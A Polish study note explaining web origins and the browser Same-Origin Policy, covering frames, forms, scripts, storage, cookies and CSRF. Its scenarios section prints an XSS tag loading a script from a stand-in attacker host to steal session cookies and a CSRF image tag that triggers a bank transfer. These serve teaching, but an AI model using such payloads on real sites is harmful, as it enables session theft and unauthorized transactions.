### Czym jest origin?

Origin: otóż, bez silenia się na próby tłumaczenia z języka angielskiego, wystarczy nam wiedzieć, że jest to nic innego niż trójka:

-   Protokół (inaczej – Schemat)
-   Host (sprawdzany rygorystycznie – to znaczy subdomena nie jest tożsama z domeną!)
-   Port

Przykłady Originu to ftp://127.0.0.1:5000 albo https://www.google.com (w tym drugim przypadku port jest obecny _implicite_: ponieważ mamy do czynienia z HTTPS wiemy, że chodzi o domyślny port 443).

![[Pasted image 20220929135704.png]]

### SOP
https://youtu.be/zul8TtVS-64

SOP to zestaw zasad izolujący karty przeglądarki między sobą tak, aby wejście na złośliwą stronę nie skutkowało negatywnymi konsekwencjami na innej.

![[Pasted image 20220929143656.png| 500]]

![[Screenshot_1373.png |600]]

![[Pasted image 20220929140504.png|600]]

Koncepcja Originu jest bardzo ważna, gdyż w świecie WWW definiuje on właściwie jednoznacznie pojedynczą aplikację. SOP w pewnym uproszczeniu (i w idealnej wersji – w rzeczywistości polityka jest dużo luźniejsza o czym zaraz) stanowi, że dwie aplikacje charakteryzujące się różnymi Originami (a więc dwie różne aplikacje) nie mogą używać (ściągać, osadzać, odpytywać) swoich wzajemnych elementów. Co to by znaczyło gdyby przeglądarka podchodziła do tej polityki bardzo rygorystycznie? Otóż:

-  Nie można by zamieścić na stronie z Originem A obrazków, skryptów, arkuszy CSS z Originu B (na przykład wszystkie usługi typu CDN przestałyby działać)
- Nie można by wywoływać zapytań HTTP z Originu A do Originu B (na przykład element <form> który jest wysyłany pod inny adres)
- Nie można by zapisywać i odczytywać ciasteczek Originu A, będąc na stronie innego Originu B

Oczywiście każdy kto miał do czynienia z aplikacjami WWW wie, że powyższe punkty nie opisują rzeczywistości. Przeglądarki, głównie przez konieczność wstecznej kompatybilności z czasami kiedy bezpieczeństwo WWW nie było najważniejszym jego celem, pozwalają na powyższe interakcje. W wielu przypadkach nie powoduje to problemów bezpieczeństwa (lub powoduje, ale nauczyliśmy się z nimi żyć). W innych jest to wręcz pożądana funkcjonalność (na przykład wspomniane CDN). Niestety niestosowanie się sztywno do polityki SOP, czasami na bezpieczeństwie się odbija.

Możesz mieć dostęp z poziomu jednej karty do drugiej, tylko jeśli z poziomu javascript otwierasz te kartę w taki sposób i w ten sposób kontekst danej strony przechowuje referecje do nowej karty. Możesz nawet modyfikować ten kontekst jeśli mają ten sam origin.

![[Pasted image 20220929141157.png]]

Jeśli natomiast otwierasz inną kartę nawet z poziomu javascripta jednej strony, to nie możesz modyfikować jej treści, ponieważ origin jest inny.

![[Pasted image 20220929141637.png]]

![[Pasted image 20220929141911.png | 500]]

Każda strona to osoby kontekst. Strony o takim samym lub o różnym origin nie mogą manipulować swoimi danymi, chyba, że jedno okno jest otwarte przez javascript drugiego. Wtedy zależnie od tego czy jest ten sam origin czy nie, polityka jest mniej lub bardziej ograniczona.

Co ciekawe strona otwarta przy pomocy window.open(), może zmieniać location tego co ją otworzyło (nie wiem czy to kwestia błędnej implementaji czy jakieś domyślne zachowanie)

![[Pasted image 20220929142301.png]]

#### Frames

![[Pasted image 20220929142432.png | 500]]

Frames ładują inną stronę w ramkach na twojej stronie.
Frames nie mogą zobaczyć treści na stronie o do dokumentów, ale za to mogą zmienić partent location. Czyli np. umieszczasz reklamę na stronie, a ona podmienia Ci location na jakąś scammerską stronę. Więcej info tutaj:
https://youtu.be/zul8TtVS-64?t=852

![[Pasted image 20220929180944.png | 500]]

#### Są dwa typy requestów, które trzeba rozpatrzeć
![[Pasted image 20220929151719.png||500]]

### Zasady SOP:

Obowiązują one w ramach przeglądarek istniejących na rynku. Jeśli napiszesz swojego klienta, to nie będą obowiązywały Cię takie zasady.

#### General

Każda strona może linkować do innej, ale nie może przeczytać odpowiedzi tej strony.


![[Pasted image 20220929155032.png | 500]]

#### Form

Formularz może być wysłany metodą POST na inny adres, a to co zwróci ta strona ładowane jest w innym kontekście (strona w tabie jest replaced), więc strona wysyłająca formularz nie ma dostępu do danych z odpowiedzi formularza.

![[Pasted image 20220929155455.png|500]]

#### Image

![[Pasted image 20220929155940.png | 500]]

#### CSS

Pomimo, że styl jest modifikowany to nie ma do niego dostępu z poziomu javascripta, image chyba podobnie

![[Pasted image 20220929160131.png | 500]]

Tutaj mamy styl z innej strony

![[Pasted image 20220929160345.png |600]]

A tutaj nie mamy podglądu wpisując document.styleSheet w konsole

![[Pasted image 20220929160450.png]]


#### Scripts

Każda strona może pobrać javascript linkowany z innej strony i uruchomić w ramach swojego kontekstu. Więc jeśli podmienisz ten javascript ze strony siteB.com, to możesz zainfekować siteA.com, ale tylko tę stronę. Nie ma ona dostępu do kontekstów innych stron.

![[Pasted image 20220929160541.png | 500]]

JSONP
Jeśli umieścisz skrypt w pliku js na stronie A, który podbiera jakieś dane z serwera, to możesz wywołać ten skrypt ze strony B i otrzymać te dane. 

![[Pasted image 20220929161830.png |500]]

#### Storage

Strony z takim samym origin mają wspólny storage.

![[Pasted image 20220929162238.png || 500]]

#### CSRF

Sam SOP nie zapobiega przed CSRF. Można wysłać np. POST requesta do innej strony poprzez komputer ofiary, której podsyłasz spreparowany link. Nie dostaniesz odpowiedzi oczywiście, ale wynika to raczej z natury ataku z CSRF i z tego, że request idzie z innego komputera niż z SOP.

![[Pasted image 20220929180333.png | 500]]

![[Pasted image 20220929180659.png |500]]

#### SOP a cookies

![[Pasted image 20220929180851.png |500]]

#### HTTP request

Tego nie rozumiem, bo przecież wysyłasz requesty do innych stron po jakieś jsony. Nie wiem czy to jest kwestia innej domeny, ale jest to na pewno kwestia przeglądarki. Taki request można przecież bez problemu wysłać do jakiegoś backendu. Ale niżej jest o tym #sop_xhr

![[Pasted image 20220929182811.png | 500]]


### Scenariusze

**Przykład 1:** Mamy do czynienia ze stroną podatną na atak typu XSS. Atakujący wstrzykuje w stronę odnośnik do swojego skryptu \<script src=”http://attacker.com/xss.js”>. 
Skrypt ten oczywiście może potencjalnie bardzo zaszkodzić użytkownikom – poprzez kradzież ciastek sesyjnych, próby wyciągnięcia tajnych danych, i tym podobne. Atak ten (przynajmniej w tym wydaniu – dociąganie zewnętrznego zasobu) nie byłby możliwy gdyby polityka SOP była rygorystycznie egzekwowana przez przeglądarkę, gdyż nie pozwoliłaby ona na zamieszczenie skryptu z innego Originu.

**Przykład 2:** Rozważmy stronę bankową podatną na atak CSRF. W momencie gdy chcemy przelać pieniądze w ilości X od odbiorcy A do odbiorcy B, wykonywane jest zapytanie HTTP GET pod adres URL https://mybank.com/transfer?from=A&to=B&amount=X. Atakujący preparuje stronę na którą zwabia swoją ofiarę, a w niej osadzony jest obrazek zdefiniowany następująco: <img src=”https://mybank.com/transfer?from=A&to=B&amount=X”/>. Ofiara po wejściu na stronę nie wie, że przeglądarka bez zawahania wyśle powyższe zapytanie w jej imieniu (gdyż załączone będą jej dane uwierzytelniające – na przykład ciastko sesyjne). Po raz kolejny, gdyby polityka SOP była sztywno egzekwowana, ten atak by się nie udał (zapytanie do Originu banku z Originu strony atakującego zostałoby zablokowane).

Jak widać, polityka SOP jest stosowana dość wybiórczo. Przykładowo, nie ma ograniczeń w zamieszczaniu obrazków z innych Originów, lub wysyłania formularzy (nawet automatycznego!) do innych Originów, a zatem (co wynika z tego) – wykonywania zapytań GET i prostych POST do innych Originów. Nie ma też ograniczeń co do zamieszczania skryptów Javascript z innych Originów, choć już na przykład skrypty te są częściowo izolowane (na przykład nie możemy wczytać kodu źródłowego skryptu z innego Originu), co akurat jest zgodne z SOP. Ciastka w pewnym sensie podlegają polityce SOP (na przykład nie można na Originie https://google.com ustawić ciastka dla https://facebook.com), ale z licznymi wyjątkami (na przykład domyślnie schemat nie ma znaczenia, a także mogę ustawić ciastko dla domeny, której jestem subdomeną – a więc na przykład ciastko ustawione na Originie http://sub.google.com dla Originu https://google.com).

**Przykład 3:** Dowolna strona która pod pewnym adresem URL zwraca po zapytaniu GET wrażliwe dane. Wyobraźmy sobie atak podobny do CSRF – zwabiamy ofiarę na złośliwą stronę, która wykonuje to zapytanie. Dane wracają do strony atakującego, **ale** **na maszynie ofiary** (w końcu to atak typu CSRF!). Chcielibyśmy je przesłać teraz atakującemu, tylko… nie możemy! W końcu, zastanówmy się, jak? Standardowe tricki typu tag <img> z odpowiednim źródłem wykonają zapytanie, ale nie umożliwią dostępu do zwróconych danych. Jedyny mechanizm który umożliwia taki dostęp w teorii (to znaczy – posiada odpowiednie API) to XHR, ale on też nam nie pomoże – odmówi przekazania danych pomiędzy Originami, właśnie dzięki SOP! #sop_xhr

Ponieważ wyjątków jest wiele, warto spróbować uprościć trochę sprawę. I tak, w kontekście SOP, uproszczona “reguła kciuka” wygląda następująco:

-   **“Zapis”** (wykonanie zapytania) Cross-Origin z reguły **jest możliwy** (przykład: wykonanie zapytania GET przy pobieraniu obrazka, lub wysyłanie formularza)
-   **“Osadzenie”** (użycie zwróconej odpowiedzi bez znajomości jej treści) Cross-Origin z reguły jest możliwe (przykład: osadzenie elementu – obrazka, ramki, skryptu – na stronie)
-   **“Odczyt”** (poznanie treści zwróconej odpowiedzi) Cross origin z reguły **nie jest możliwy** (przykład: wczytanie treści skryptu lub odpowiedzi XHR)

Oczywiście, uproszczona znaczy też “nie zawsze działa”, gdyż wyjątków trochę jest – jako punkt startowy jednak, sprawdzi się całkiem nieźle.

Na marginesie: zainteresowanym szczegółami SOP polecam niezwykle obszerne opracowanie tego tematu autorstwa Michała Zalewskiego (lcamtuf) – albo w postaci dostępnego online opracowanian [Browser Security Handbook](https://code.google.com/archive/p/browsersec/wikis/Main.wiki) (pozycja trochę leciwa), albo w postaci książki [The Tangled Web](http://lcamtuf.coredump.cx/tangled/)

Wspomnę też, że mamy możliwość zaostrzania zachowania przeglądarek, co pozwala nam emulować bardziej rygorystyczną politykę SOP niż ta domyślna. Przykładem tu jest choćby Content Security Policy, opisywane na Sekuraku zarówno [w wersji 1.0](https://sekurak.pl/czym-jest-content-security-policy/), [jak i 2.0](https://sekurak.pl/wszystko-o-csp-2-0-content-security-policy-jako-uniwersalny-straznik-bezpieczenstwa-aplikacji-webowej/)– nie to jednak jest tematem naszego artykułu.